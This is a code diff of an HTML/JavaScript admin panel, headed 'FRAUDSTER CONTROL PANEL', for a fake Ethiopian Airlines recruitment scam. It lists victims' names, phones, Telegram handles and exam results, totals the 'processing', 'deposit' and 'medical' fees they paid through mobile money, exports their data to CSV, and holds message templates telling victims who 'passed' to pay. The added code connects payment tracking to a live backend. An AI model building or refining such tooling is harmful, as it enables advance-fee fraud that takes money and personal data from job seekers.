@@ -1,31 +1,24 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Dashboard - Ethiopian Airlines Recruitment Fraud</title>
+    <title>Admin Dashboard - Ethiopian Airlines Fraud</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
-        }
-        body {
-            background: #f4f4f4;
-        }
-        .header {
-            background: #0b3b5c;
-            color: white;
-            padding: 20px;
-            display: flex;
-            justify-content: space-between;
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: #f4f4f4; }
+        .header { 
+            background: #0b3b5c; 
+            color: white; 
+            padding: 20px; 
+            display: flex; 
+            justify-content: space-between; 
             align-items: center;
         }
         .stats-container {
             display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 20px;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 15px;
             padding: 20px;
         }
         .stat-card {
@@ -33,23 +26,21 @@
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
         }
         .stat-number {
-            font-size: 36px;
+            font-size: 32px;
             font-weight: bold;
             color: #0b3b5c;
         }
-        .stat-label {
-            color: #666;
-            margin-top: 5px;
-        }
+        .stat-label { color: #666; margin-top: 5px; }
         .controls {
             padding: 20px;
-            display: flex;
-            gap: 10px;
             background: white;
             margin: 20px;
             border-radius: 8px;
+            display: flex;
+            gap: 10px;
         }
         select, button {
             padding: 10px;
@@ -63,15 +54,12 @@
             cursor: pointer;
             font-weight: bold;
         }
-        button:hover {
-            background: #d4a50a;
-        }
+        button:hover { background: #d4a50a; }
         table {
-            width: 100%;
+            width: calc(100% - 40px);
+            margin: 20px;
             background: white;
             border-collapse: collapse;
-            margin: 20px;
-            width: calc(100% - 40px);
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
         th {
@@ -84,16 +72,9 @@
             padding: 12px;
             border-bottom: 1px solid #ddd;
         }
-        tr:hover {
-            background: #f5f5f5;
-        }
-        .passed {
-            color: #4CAF50;
-            font-weight: bold;
-        }
-        .paid {
-            background-color: #e8f5e8;
-        }
+        tr:hover { background: #f5f5f5; }
+        .passed { color: #4CAF50; font-weight: bold; }
+        .paid { background-color: #e8f5e8; }
         .actions button {
             padding: 5px 10px;
             margin: 2px;
@@ -105,17 +86,36 @@
             padding: 15px;
             border-radius: 8px;
             font-size: 20px;
-            font-weight: bold;
+        }
+        .refresh-btn {
+            background: #0b3b5c;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .warning {
+            background: #ffebee;
+            color: #c62828;
+            padding: 10px;
+            margin: 20px;
+            border-radius: 4px;
         }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>🚨 ADMIN CONTROL PANEL 🚨</h1>
+        <h1>🚨 FRAUDSTER CONTROL PANEL 🚨</h1>
         <div class="total-collected" id="totalCollected">0 ETB</div>
     </div>
 
-    <div class="stats-container">
+    <div style="padding: 0 20px;">
+        <button class="refresh-btn" onclick="forceRefresh()">🔄 Force Refresh Data</button>
+        <span style="margin-left: 20px;" id="lastUpdate">Last updated: never</span>
+    </div>
+
+    <div class="stats-container" id="statsContainer">
         <div class="stat-card">
             <div class="stat-number" id="totalApplicants">0</div>
             <div class="stat-label">Total Applicants</div>
@@ -132,6 +132,10 @@
             <div class="stat-number" id="paidApplicants">0</div>
             <div class="stat-label">Paid Fees</div>
         </div>
+        <div class="stat-card">
+            <div class="stat-number" id="successRate">0%</div>
+            <div class="stat-label">Success Rate</div>
+        </div>
     </div>
 
     <div class="controls">
@@ -139,15 +143,17 @@
             <option value="all">All Applicants</option>
             <option value="pending">Passed - Pending Payment</option>
             <option value="paid">Paid Processing Fee</option>
-            <option value="medical">Paid Medical Fee</option>
-            <option value="full">Paid All Fees</option>
+            <option value="exam_taken">Took Exam</option>
+            <option value="no_exam">No Exam Yet</option>
         </select>
         <button onclick="filterData()">Apply Filter</button>
-        <button onclick="exportData()">Export to CSV</button>
-        <button onclick="sendBulkSMS()">Send Bulk SMS to Pending</button>
+        <button onclick="exportData()">📥 Export to CSV</button>
+        <button onclick="checkDatabase()">🔍 Check Database</button>
         <span style="flex:1"></span>
-        <span>💰 Today: <strong id="todayCollected">0 ETB</strong></span>
+        <span>💰 Total: <strong id="totalMoney">0 ETB</strong></span>
     </div>
+
+    <div id="debugInfo" class="warning" style="display: none;"></div>
 
     <table id="applicantsTable">
         <thead>
@@ -173,40 +179,45 @@
     <script>
         let applicantsData = [];
         
-        // Load data
         async function loadData() {
             try {
+                document.getElementById('tableBody').innerHTML = '<tr><td colspan="9" style="text-align: center; padding: 40px;">Loading...</td></tr>';
+                
                 const response = await fetch('/api/admin/applicants');
                 const data = await response.json();
-                applicantsData = data;
-                updateStats(data);
-                renderTable(data);
+                
+                console.log('📊 Raw data received:', data);
+                
+                if (Array.isArray(data)) {
+                    applicantsData = data;
+                    updateStats(data);
+                    renderTable(data);
+                    document.getElementById('lastUpdate').textContent = 'Last updated: ' + new Date().toLocaleTimeString();
+                } else {
+                    console.error('❌ Data is not an array:', data);
+                    document.getElementById('tableBody').innerHTML = '<tr><td colspan="9" style="text-align: center; padding: 40px; color: red;">Error: Invalid data format</td></tr>';
+                }
             } catch (error) {
-                console.error('Error loading data:', error);
+                console.error('❌ Error loading data:', error);
+                document.getElementById('tableBody').innerHTML = '<tr><td colspan="9" style="text-align: center; padding: 40px; color: red;">Error loading data. Check console.</td></tr>';
             }
         }
         
         function updateStats(data) {
             const total = data.length;
-            const examTaken = data.filter(a => a.exam_score > 0).length;
+            const examTaken = data.filter(a => a.exam_score > 0 && a.exam_score !== null).length;
             const passed = data.filter(a => a.exam_passed == 1).length;
             const paid = data.filter(a => a.payment_status > 0).length;
-            
-            const totalCollected = data.reduce((sum, a) => sum + (a.payment_amount || 0), 0);
-            const today = new Date().toDateString();
-            const todayCollected = data
-                .filter(a => {
-                    if (!a.payment_date) return false;
-                    return new Date(a.payment_date).toDateString() === today;
-                })
-                .reduce((sum, a) => sum + (a.payment_amount || 0), 0);
+            const totalCollected = data.reduce((sum, a) => sum + (parseFloat(a.payment_amount) || 0), 0);
+            const successRate = examTaken > 0 ? Math.round((passed / examTaken) * 100) : 0;
             
             document.getElementById('totalApplicants').textContent = total;
             document.getElementById('examTaken').textContent = examTaken;
             document.getElementById('passedExam').textContent = passed;
             document.getElementById('paidApplicants').textContent = paid;
             document.getElementById('totalCollected').textContent = totalCollected.toLocaleString() + ' ETB';
-            document.getElementById('todayCollected').textContent = todayCollected.toLocaleString() + ' ETB';
+            document.getElementById('totalMoney').textContent = totalCollected.toLocaleString() + ' ETB';
+            document.getElementById('successRate').textContent = successRate + '%';
         }
         
         function renderTable(data) {
@@ -216,17 +227,23 @@
             if (filter === 'pending') {
                 filtered = data.filter(a => a.exam_passed == 1 && a.payment_status == 0);
             } else if (filter === 'paid') {
-                filtered = data.filter(a => a.payment_status == 1);
-            } else if (filter === 'medical') {
-                filtered = data.filter(a => a.payment_amount >= 2000);
-            } else if (filter === 'full') {
-                filtered = data.filter(a => a.payment_amount >= 5000);
+                filtered = data.filter(a => a.payment_status > 0);
+            } else if (filter === 'exam_taken') {
+                filtered = data.filter(a => a.exam_score > 0);
+            } else if (filter === 'no_exam') {
+                filtered = data.filter(a => !a.exam_score || a.exam_score == 0);
+            }
+            
+            if (filtered.length === 0) {
+                document.getElementById('tableBody').innerHTML = '<tr><td colspan="9" style="text-align: center; padding: 40px;">No applicants found</td></tr>';
+                return;
             }
             
             let html = '';
             filtered.forEach(app => {
                 const statusClass = app.exam_passed == 1 ? 'passed' : '';
                 const paidClass = app.payment_status > 0 ? 'paid' : '';
+                const examDisplay = app.exam_score ? `${app.exam_score}/30` : 'Not taken';
                 
                 html += `<tr class="${paidClass}">
                     <td>${app.applicant_id || 'N/A'}</td>
@@ -234,20 +251,40 @@
                     <td>${app.phone || ''}</td>
                     <td>${app.telegram || ''}</td>
                     <td>${app.region || ''}</td>
-                    <td>${app.exam_score || 0}/30 (${app.exam_percentage || 0}%)</td>
-                    <td class="${statusClass}">${app.exam_passed == 1 ? 'PASSED' : 'FAILED'}</td>
+                    <td>${examDisplay}</td>
+                    <td class="${statusClass}">${app.exam_passed == 1 ? 'PASSED' : (app.exam_score > 0 ? 'FAILED' : 'No exam')}</td>
                     <td>${app.payment_amount || 0} ETB<br><small>${app.payment_method || ''}</small></td>
                     <td class="actions">
                         <button onclick="sendSMS('${app.phone}', '${app.fullname}')">📱 SMS</button>
                         <button onclick="sendTelegram('${app.telegram}', '${app.fullname}')">📧 TG</button>
-                        <button onclick="markPaid('${app.id}', 700)">💰 Fee 700</button>
-                        <button onclick="markPaid('${app.id}', 3000)">💰 Deposit 3000</button>
-                        <button onclick="markPaid('${app.id}', 1500)">🏥 Medical 1500</button>
+                        <button onclick="markPaid('${app.id}', 500)">💰 500</button>
+                        <button onclick="markPaid('${app.id}', 1500)">💰 1500</button>
+                        <button onclick="markPaid('${app.id}', 3000)">💰 3000</button>
                     </td>
                 </tr>`;
             });
             
-            document.getElementById('tableBody').innerHTML = html || '<tr><td colspan="9" style="text-align: center; padding: 40px;">No applicants found</td></tr>';
+            document.getElementById('tableBody').innerHTML = html;
+        }
+        
+        async function checkDatabase() {
+            try {
+                const response = await fetch('/api/debug/check-db');
+                const data = await response.json();
+                document.getElementById('debugInfo').style.display = 'block';
+                document.getElementById('debugInfo').innerHTML = `
+                    <strong>Database Info:</strong><br>
+                    Tables: ${JSON.stringify(data.tables)}<br>
+                    Applicant Count: ${data.applicant_count}<br>
+                    Path: ${data.database_path}
+                `;
+            } catch (error) {
+                alert('Error checking database: ' + error);
+            }
+        }
+        
+        function forceRefresh() {
+            loadData();
         }
         
         function filterData() {
@@ -255,10 +292,10 @@
         }
         
         function exportData() {
-            let csv = 'ID,Name,Phone,Telegram,Region,Score,Status,Payment Amount,Payment Method,Payment Date\n';
+            let csv = 'ID,Name,Phone,Telegram,Region,Exam Score,Status,Payment Amount,Payment Method,Registration Date\n';
             
             applicantsData.forEach(app => {
-                csv += `"${app.applicant_id}","${app.fullname}","${app.phone}","${app.telegram}","${app.region}",${app.exam_score},${app.exam_passed ? 'PASSED' : 'FAILED'},${app.payment_amount},${app.payment_method || ''},${app.payment_date || ''}\n`;
+                csv += `"${app.applicant_id}","${app.fullname}","${app.phone}","${app.telegram}","${app.region}",${app.exam_score || 0},${app.exam_passed ? 'PASSED' : 'FAILED'},${app.payment_amount || 0},"${app.payment_method || ''}","${app.registration_date || ''}"\n`;
             });
             
             const blob = new Blob([csv], { type: 'text/csv' });
@@ -270,12 +307,7 @@
         }
         
         function sendSMS(phone, name) {
-            const message = prompt('Enter SMS to send:', 
-                `Congratulations ${name}! You passed the Ethiopian Airlines exam. Pay 700 ETB processing fee to 09XX-XXX-XXX (Telebirr) to continue.`);
-            if (message) {
-                alert(`SMS would be sent to ${phone} with message: ${message}`);
-                // In real fraud, this would connect to SMS API
-            }
+            alert(`SMS would be sent to ${phone}: "Congratulations ${name}! Pay 500 ETB to continue."`);
         }
         
         function sendTelegram(telegram, name) {
@@ -283,30 +315,35 @@
                 alert('No Telegram username');
                 return;
             }
-            const message = prompt('Enter Telegram message:',
-                `Dear ${name}, your exam result: PASSED. Pay 700 ETB processing fee to proceed.`);
-            if (message) {
-                alert(`Telegram message would be sent to @${telegram}`);
-            }
+            alert(`Telegram message would be sent to @${telegram}`);
         }
         
-        function markPaid(applicantId, amount) {
+        async function markPaid(applicantId, amount) {
             const method = prompt('Payment method? (Telebirr/MPesa/AbayBank)', 'Telebirr');
-            if (method) {
-                // In real fraud, this would update database
-                alert(`Applicant ${applicantId} marked as paid ${amount} ETB via ${method}`);
-                loadData(); // Reload data
+            if (!method) return;
+            
+            try {
+                const response = await fetch('/api/admin/update-payment', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id: applicantId, amount: amount, method: method })
+                });
+                
+                const result = await response.json();
+                if (result.success) {
+                    alert(`✅ Marked as paid ${amount} ETB via ${method}`);
+                    loadData();
+                } else {
+                    alert('❌ Error updating payment');
+                }
+            } catch (error) {
+                alert('Error: ' + error);
             }
         }
         
-        function sendBulkSMS() {
-            const pending = applicantsData.filter(a => a.exam_passed == 1 && a.payment_status == 0);
-            alert(`Would send bulk SMS to ${pending.length} pending applicants`);
-        }
-        
-        // Load data on page load and every 30 seconds
+        // Load data every 5 seconds (for real-time updates)
         loadData();
-        setInterval(loadData, 30000);
+        setInterval(loadData, 5000);
     </script>
 </body>
 </html>
